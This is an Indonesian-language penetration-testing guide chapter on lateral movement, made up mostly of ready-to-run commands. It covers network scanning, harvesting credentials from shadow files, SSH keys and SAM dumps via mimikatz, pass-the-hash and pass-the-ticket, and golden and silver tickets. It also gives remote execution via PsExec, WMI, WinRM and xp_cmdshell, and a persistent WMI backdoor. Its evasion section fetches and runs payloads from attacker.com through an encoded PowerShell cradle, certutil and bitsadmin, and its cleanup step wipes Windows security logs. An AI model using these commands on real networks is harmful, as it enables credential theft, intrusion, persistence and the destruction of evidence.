# 3.4 Lateral Movement

Lateral movement adalah proses bergerak melalui network setelah mendapat akses awal untuk mengakses sistem lain, mencari data berharga, dan mengidentifikasi high-value targets. Ini adalah bagian krusial dari post-exploitation phase.

## Methodology Lateral Movement

1. **Reconnaissance** - Mengumpulkan informasi tentang network
2. **Credential Harvesting** - Mendapatkan credentials dari sistem yang dikompromikan
3. **Credential Reuse** - Menggunakan credentials di sistem lain
4. **Exploitation** - Mendapatkan akses ke sistem lain
5. **Privilege Escalation** - Naik ke privileges lebih tinggi
6. **Persistence** - Mempertahankan akses di sistem baru

## Network Discovery

### Basic Network Enumeration

```bash
# Network information gathering
ip addr show
ip route

# Discover other hosts
nmap -sn 192.168.1.0/24  # Ping sweep

# Discover open ports across network
nmap -p 445,3389,22,21,23 192.168.1.0/24

# Check untuk neighbor discovery tables
ip neigh show
arp -a
```

### Advanced Network Scanning

```bash
# Quick port scan untuk common services
for ip in $(seq 1 254); do
    echo "Scanning 192.168.1.$ip"
    nmap -Pn --open -T4 -p 22,23,53,80,135,139,443,445,993,995,1433,3306,3389,5432,5985,6379,8080,8443,9200,11211 192.168.1.$ip &
done

# Check untuk SMB signing status
nmap -p445 --script smb2-security-mode 192.168.1.0/24

# Discover Windows domain controllers
nmap -p88 --script krb5-enum-users 192.168.1.0/24
```

### Network Service Discovery

```bash
# SMB shares discovery
smbmap -H 192.168.1.10
smbmap -H 192.168.1.10 -u guest -p guest -R

# NFS shares discovery
showmount -e 192.168.1.10

# RDP availability
nmap -p 3389 --script rdp-enum-encryption 192.168.1.10

# SSH key discovery
ssh-keyscan -t rsa 192.168.1.10 > /tmp/known_hosts
```

## Credential Harvesting

### Linux Credential Harvesting

```bash
# Password files
cat /etc/passwd
cat /etc/shadow

# SSH keys
find / -name "id_rsa*" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Configuration files dengan credentials
grep -R "password=" /etc/ 2>/dev/null
grep -R "passwd" /etc/ 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.php_history
```

### Windows Credential Harvesting

```cmd
# SAM database extraction
# Dengan elevated privileges
reg save hklm\sam c:\temp\sam.save
reg save hklm\system c:\temp\system.save

# Get dengan tools
# Use mimikatz:
mimikatz "privilege::debug" "sekurlsa::logonpasswords"

# Stored credentials
cmdkey /list

# RDP cached credentials
# Cek di:
# HKCU\Software\Microsoft\Terminal Server Client\Servers
```

### Application Credential Harvesting

```bash
# Database credentials
# MySQL
cat /etc/mysql/my.cnf | grep -i password

# PostgreSQL
cat /var/lib/postgresql/.pgpass

# Apache/Nginx config
grep -R "password" /etc/apache2/ 2>/dev/null
grep -R "password" /etc/nginx/ 2>/dev/null

# SSH config
cat ~/.ssh/config
grep -i "password" ~/.ssh/config
```

## Pass the Hash (PtH)

Pass the Hash adalah teknik yang menggunakan NTLM hash untuk authentication tanpa perlu crack password.

### Linux PtH Tools

```bash
# Dengan CrackMapExec
crackmapexec smb 192.168.1.10 -u user -H hash -x whoami
crackmapexec smb 192.168.1.10 -u user -H hash -d domain.com -x powershell

# Dengan pth-winexe
pth-winexe -U user%hash //192.168.1.10 cmd

# Dengan smbclient
smbclient //192.168.1.10/c$ -U user --pw-nt-hash hash
```

### Metasploit PtH

```bash
# Use psexec module
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser user
set SMBPass hash
set SMBDomain DOMAIN
exploit

# Use windows/smb/psexec_psh untuk PowerShell
# Atau use exploit/windows/smb/ms17_010_command
```

### Impacket PtH

```bash
# psexec.py
python psexec.py -hashes :hash user@192.168.1.10

# wmiexec.py
python wmiexec.py -hashes :hash user@192.168.1.10

# smbexec.py
python smbexec.py -hashes :hash user@192.168.1.10

# atexec.py - Execute via scheduled task
python atexec.py -hashes :hash user@192.168.1.10 whoami
```

## Pass the Ticket (PtT)

Pass the Ticket menggunakan Kerberos tickets untuk authentication di Active Directory.

### Ticket Extraction

```bash
# Dengan Mimikatz
mimikatz "privilege::debug" "sekurlsa::tickets /export"

# Extract semua tickets
mimikatz "kerberos::list /export"

# Extract specific ticket
mimikatz "kerberos::list /export" | grep "krbtgt"
```

### Ticket Reuse Linux

```bash
# Set ticket untuk digunakan
export KRB5CCNAME=/path/to/ticket.kirbi

# Use dengan WMIExec
python wmiexec.py -no-pass -k domain.com@192.168.1.10

# Use dengan psexec
python psexec.py -no-pass -k domain.com@192.168.1.10

# Use dengan smbclient
smbclient -k //192.168.1.10/c$
```

### Ticket Reuse Windows

```bash
# Inject ticket dengan Mimikatz
mimikatz "kerberos::ptt ticket.kirbi"

# Setelah inject, access resources
dir \\server\share
```

## Over-Pass-the-Hash

Overpass the hash adalah proses convert NTLM hash menjadi Kerberos ticket.

```bash
# Dengan Mimikatz
mimikatz "privilege::debug" "sekurlsa::pth /user:user /domain:domain.com /ntlm:hash /run:cmd"

# Atau:
mimikatz "privilege::debug" "sekurlsa::pth /user:user /domain:domain.com /ntlm:hash"
mimikatz "kerberos::ask"
```

## Golden & Silver Tickets

### Golden Ticket

Golden ticket menggunakan krbtgt hash untuk membuat ticket untuk siapa saja.

```bash
# Dapatkan krbtgt hash
mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"

# Buat golden ticket
mimikatz "kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi"

# Gunakan ticket
mimikatz "kerberos::ptt golden.kirbi"
```

### Silver Ticket

Silver ticket untuk specific service.

```bash
# Dapatkan service hash
mimikatz "lsadump::dcsync /domain:domain.com /user:mssqlsvc"

# Buat silver ticket
mimikatz "kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:cifs /rc4:hash /user:user /ticket:silver.kirbi"
```

## SSH Lateral Movement

### SSH Key Reuse

```bash
# Test found SSH key pada multiple hosts
for ip in $(cat targets.txt); do
    echo "Testing $ip"
    ssh -i id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@$ip "whoami"
done

# Dengan parallel execution
parallel -a targets.txt -j 10 "ssh -i id_rsa -o StrictHostKeyChecking=no root@{} 'whoami'"
```

### SSH Agent Forwarding

```bash
# Enable agent forwarding saat SSH
ssh -A user@initial_target

# Dari initial target, SSH ke next host
ssh user@internal_host

# SSH key akan forward melalui agent
```

### SSH Tunneling

```bash
# Local port forward untuk access internal service
ssh -L 8080:internal_host:80 user@jumpbox

# Remote port forward untuk expose service
ssh -R 8080:localhost:80 user@remote_host

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@jumpbox
# Configure browser untuk menggunakan SOCKS proxy 127.0.0.1:1080
```

### SSH Bastion Host

```bash
# Konfigurasi SSH config untuk multi-hop
cat > ~/.ssh/config << EOF
Host internal.*
    ProxyJump jumpbox@domain.com
    User internal_user
    IdentityFile ~/.ssh/internal_key

Host jumpbox.domain.com
    User jump_user
    IdentityFile ~/.ssh/jump_key
EOF

# Direct SSH ke internal host
ssh internal-01
```

## RDP Lateral Movement

### RDP with Credentials

```cmd
# Dengan credentials
xfreerdp /u:domain\user /p:password /v:target.domain.com

# Save credentials
cmdkey /add:target.domain.com /user:domain\user /pass:password
mstsc /v:target.domain.com
```

### RDP Pass the Hash

```bash
# Dengan xfreerpd
xfreerdp /u:domain\user /pth:hash /v:target.domain.com

# Dengan mimikatz dan mstsc
mimikatz "sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:mstsc.exe"
```

### RDP Hijacking

```cmd
# List active sessions
query user

# Connect ke spesifik session
tscon <session_id> /dest:sessionname
# Atau:
rwinsta <session_id>
```

## WMI Lateral Movement

### WMI Command Execution

```bash
# WMIExec dari Impacket
python wmiexec.py domain/user:password@target
python wmiexec.py -hashes :hash user@target

# WMI dengan PowerShell
powershell -c "Invoke-WmiMethod -Path win32_process -Name create -ArgumentList 'cmd.exe /c powershell -enc <base64>'"
```

### WMI Event Subscription

```powershell
# Create persistent WMI backdoor
$Filter = Set-WmiEventFilter -Name "ProcessFilter" -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
$Consumer = Set-WmiEventConsumer -Name "ProcessConsumer" -CommandLineTemplate "powershell -enc <base64>"
Set-WmiEventFilterToConsumerBinding -Filter $Filter -Consumer $Consumer
```

## SMB Lateral Movement

### SMBExec

```bash
# Dengan Impacket
python smbexec.py domain/user:password@target
python smbexec.py -hashes :hash user@target

# Dengan Metasploit
use auxiliary/admin/smb/smbexec
set RHOSTS target
set SMBUser user
set SMBPass password
set SMBDomain domain
run
```

### PSExec

```cmd
# PSExec dari Sysinternals
psexec \\target -u domain\user -p password cmd

# Dengan Metasploit
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser user
set SMBPass hash
set SMBDomain domain
exploit
```

## WinRM Lateral Movement

```bash
# Dengan CrackMapExec
crackmapexec winrm target -u user -p password -x whoami

# Dengan evil-winrm
evil-winrm -i target -u user -p password

# Dengan Metasploit
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS target
set USERNAME user
set PASSWORD password
set CMD whoami
run
```

## Database Lateral Movement

### MySQL

```sql
-- Check user privileges
SELECT user,host FROM mysql.user;

-- If file privileges available, read files
SELECT LOAD_FILE('/etc/passwd');

-- UDF untuk command execution
SELECT do_system('whoami');
```

### MSSQL

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';

-- Check linked servers untuk chain
EXEC sp_linkedservers;
```

## Lateral Movement Automation

### PowerShell Empire

```powershell
# Create listener
listeners --http 192.168.1.100

# Create agent
launcher powershell http://192.168.1.100

# Lateral movement modules
usemodule situational_awareness/network/arpscan
usemodule situational_awareness/network/powerview/get_localdomain
usemodule situational_awareness/network/powerview/find_domain_share

# Credential reuse
usemodule credentials/tokens/elevate
usemodule credentials/mimikatz/logonpasswords

# Lateral movement
usemodule lateral_movement/invoke_psexec
usemodule lateral_movement/invoke_wmi
usemodule lateral_movement/invoke_dcom
```

### CrackMapExec Automation

```bash
# Multi-host credential testing
crackmapexec smb hosts.txt -u user -p password -x "whoami"

# Dump SAM dari multiple hosts
crackmapexec smb hosts.txt -u user -p password --sam

# Pass the hash
crackmapexec smb hosts.txt -u user -H hash -x "powershell -enc <base64>"
```

### BloodHound

```bash
# Collect data
SharpHound.exe -c All
SharpHound.exe -c Session,LoggedOn

# Analyze dengan Neo4j
# Import data ke BloodHound GUI
# Query untuk find shortest path ke high-value targets

# Common queries:
MATCH (n:User) WHERE n.name STARTS WITH 'ADMIN' RETURN n
MATCH p=shortestPath((u:User {name:'DOMAIN\\user'})-[*1..]->(g:Group {name:'DOMAIN\\Domain Admins'})) RETURN p
```

## Evasion Techniques

### Anti-Analysis

```bash
# Check untuk virtualization sebelum menjalankan payload
if system("dmidecode | grep -i vmware"); then
    exit
fi

# Sleep random untuk menghindar pattern detection
sleep $((RANDOM % 300))
```

### Obfuscation

```bash
# Encode PowerShell command
$command = "Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://attacker.com/ps1'))"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [System.Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Living Off The Land

```bash
# Gunakan built-in tools untuk lateral movement
# WMI:
powershell -c "Invoke-WmiMethod -Path win32_process -Name create -ArgumentList 'cmd.exe'"

# Certutil untuk download:
certutil -urlcache -f http://attacker.com/file.exe

# Bitsadmin untuk download:
bitsadmin /transfer myjob http://attacker.com/file.exe C:\temp\file.exe
```

## Important Considerations

1. **Detection Risk** - Setiap lateral movement meningkatkan risiko deteksi
2. **Log Generation** - Semua aktivitas akan dicatat di log files
3. **Network Segmentation** - Gunakan network information untuk memahami segmentation
4. **Domain Trust** - Perhatikan domain trust relationships
5. **Time Synchronization** - Perhatikan time sync issues di distributed environment

## Cleanup

```bash
# Remove created accounts
net user tempuser /delete

# Remove scheduled tasks
schtasks /delete /tn "TempTask" /f

# Clear logs
wevtutil cl System
wevtutil cl Security

# Remove tools
del C:\temp\*
rm -f /tmp/*
```

Lateral movement adalah bagian krusial dari modern penetration testing. Pilih teknik yang sesuai dengan environment dan objective testing yang sedang dilakukan.